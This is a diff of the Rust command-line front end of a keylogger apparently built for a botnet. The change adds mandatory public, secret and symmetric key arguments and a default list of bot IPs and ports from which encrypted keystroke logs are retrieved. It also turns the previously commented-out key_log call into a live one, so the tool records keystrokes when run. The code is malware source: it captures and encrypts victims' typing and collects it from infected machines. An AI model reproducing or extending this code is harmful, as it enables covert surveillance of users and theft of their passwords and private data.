@@ -2,6 +2,7 @@
 extern crate clap;
 
 extern crate keylogger_lib;
+
 use keylogger_lib::*;
 
 fn main() {
@@ -10,7 +11,8 @@ fn main() {
         .author("Hand of C'thulhu")
         .arg(clap::Arg::with_name("generate")
             .long("generate")
-            .conflicts_with_all(&["decrypt", "retrieve", "bot_addr"])
+            .requires("secret_key")
+            .conflicts_with_all(&["decrypt", "retrieve"])
             .takes_value(false))
         .arg(clap::Arg::with_name("decrypt")
             .short("D")
@@ -18,15 +20,14 @@ fn main() {
             .value_name("FILE")
             .help("Specify the decrypt file, and turn into decrypt mode")
             .takes_value(true)
+            .requires("secret_key")
             .min_values(0))
-        .arg(clap::Arg::with_name("asymmetric")
-            .short("A")
-            .long("asym")
-            .takes_value(false))
-        .arg(clap::Arg::with_name("asymmetric_keys")
-            .long("asym-keys")
-            .min_values(2).takes_value(true)
-            .value_names(&["PUB_KEY_FILE", "SEC_KEY_FILE"]))
+        .arg(clap::Arg::with_name("secret_key")
+            .short("s")
+            .long("sec-key")
+            .takes_value(true)
+            .help("Secret asymmetric encryption key")
+            .value_name("SEC_KEY_FILE"))
         .arg(clap::Arg::with_name("retrieve")
             .short("R")
             .long("retrieve")
@@ -35,33 +36,26 @@ fn main() {
             .value_name("DEST_FOLDER"))
         .arg(clap::Arg::with_name("bot_addr")
             .long("bot-addr")
+            .help("Ips and ports to retrieve encrypted logs from")
             .requires("retrieve")
             .takes_value(true)
-            .value_name("FILE"))
-        .arg(clap::Arg::with_name("KEY")
-            .help("Encryption Key")
-//            .short("k")
-//            .long("key")
-//            .takes_value(true)
-//            .value_name("FILE")
-             )
+            .value_name("FILE")
+            .default_value("bot_addr.list"))
+        .arg(clap::Arg::with_name("SYM_KEY")
+            .help("Symmetric encryption key")
+            .required(true))
+        .arg(clap::Arg::with_name("PUB_KEY")
+            .help("Public asymmetric encryption key")
+            .required(true))
         .get_matches();
 
     if args.is_present("generate") {
-        if let Some(data) = args.values_of("asymmetric_keys") {
-            let data: Vec<&str> = data.collect();
-            if data.len() != 2 {
-                panic!("Asymmetric flag missing second argument")
-            }
-            if let Err(err) = gen_key_pair(data[0], data[1]) {
-                println!("{}", err.description());
-            } else {
-                println!("Public and private key generated");
-            }
+        if let Err(err) = gen_key_pair(args.value_of("PUB_KEY").unwrap(), args.value_of("secret_key").unwrap()) {
+            println!("{}", err.description());
         } else {
-            let key_path = args.value_of("KEY").unwrap();
-            generate_key_and_nonce(key_path).expect("Key generation failed");
+            println!("Public and private key generated");
         }
+        generate_key_and_nonce(args.value_of("SYM_KEY").unwrap()).expect("Key generation failed");
         return;
     }
 
@@ -97,50 +91,27 @@ fn main() {
         if !args.is_present("decrypt") { return; }
 
         for path in encrypted_data_paths {
-            if let Some(data) = args.values_of("asymmetric_keys") {
-                let data: Vec<&str> = data.collect();
-                if data.len() != 2 {
-                    println!("Asymmetric flag missing second argument");
-                    return;
-                }
-                decrypt_asym_sym(path.to_str().unwrap(), data[0], data[1], args.value_of("KEY").unwrap())
-                    .unwrap_or_else(|err| println!("Error with decrypting: {}", err));
-            } else {
-                decrypt_sym(path.to_str().unwrap(), args.value_of("KEY").unwrap())
-                    .unwrap_or_else(|err| println!("Error with decrypting: {}", err));
-            }
+            decrypt_asym_sym(
+                path.to_str().unwrap(),
+                args.value_of("PUB_KEY").unwrap(),
+                args.value_of("secret_key").unwrap(),
+                args.value_of("SYM_KEY").unwrap())
+                .unwrap_or_else(|err| println!("Error with decrypting: {}", err));
         }
         return;
     }
 
     if let Some(decrypt_path) = args.value_of("decrypt") {
-        if let Some(data) = args.values_of("asymmetric_keys") {
-            let data: Vec<&str> = data.collect();
-            if data.len() != 2 {
-                println!("Asymmetric flag missing second argument");
-                return;
-            }
-
-            decrypt_asym_sym(decrypt_path, data[0], data[1], args.value_of("KEY").unwrap())
-                .unwrap_or_else(|err| println!("Error with decrypting: {}", err));
-        } else {
-            decrypt_sym(decrypt_path, args.value_of("KEY").unwrap())
-                .unwrap_or_else(|err| println!("Error with decrypting: {}", err));
-        }
+        decrypt_asym_sym(
+            decrypt_path,
+            args.value_of("PUB_KEY").unwrap(),
+            args.value_of("secret_key").unwrap(),
+            args.value_of("SYM_KEY").unwrap())
+            .unwrap_or_else(|err| println!("Error with decrypting: {}", err));
     } else {
-        let key_path = args.value_of("KEY").unwrap();
-        if args.is_present("asymmetric") {
-            if let Err(problem) = get_public_key(key_path) {
-                println!("Error with key input: {}", problem.description());
-            } else {
-                //key_log(&EncryptionType::Asymmetric(args.value_of("KEY").unwrap().to_owned()));
-            }
-        } else {
-            if let Err(problem) = generate_key_and_nonce(key_path) {
-                println!("Error with key input: {}", problem.description());
-            } else {
-                //key_log(&EncryptionType::Symmetric(args.value_of("KEY").unwrap().to_owned()));
-            }
-        }
+        key_log(&keylogger_lib::EncryptionDetails {
+            pub_key_loc: args.value_of("PUB_KEY").unwrap().to_owned(),
+            sym_key_loc: args.value_of("SYM_KEY").unwrap().to_owned(),
+        });
     }
 }
